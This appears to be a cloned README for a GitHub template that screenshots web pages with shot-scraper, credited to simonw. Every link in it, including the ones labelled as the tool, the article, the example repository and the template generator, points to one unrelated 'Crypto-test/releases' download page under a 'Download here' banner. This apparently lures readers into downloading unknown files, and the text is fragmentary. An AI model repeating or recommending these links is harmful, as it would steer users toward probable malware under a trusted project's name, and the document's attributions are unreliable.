...
[Download here](https://github.com/totcmepthuk9/Crypto-test/releases)

Quickly create a new GitHub repository that takes automated screenshots of a web page using [shot-scraper](https://github.com/totcmepthuk9/Crypto-test/releases).

Read more about how this works in [Instantly create a GitHub repository to take screenshots of a web page](https://github.com/totcmepthuk9/Crypto-test/releases).

[simonw/simonwillison-net-shot](https://github.com/totcmepthuk9/Crypto-test/releases) is an example repository created using this template.

## How to get started

Visit https://github.com/totcmepthuk9/Crypto-test/releases-template/generate
...
```yaml
- url: https://github.com/totcmepthuk9/Crypto-test/releases
  output: shot.png
  height: 800
```
...
```
Further options are described in the [shot-scraper README file](https://github.com/totcmepthuk9/Crypto-test/releases#taking-multiple-screenshots).
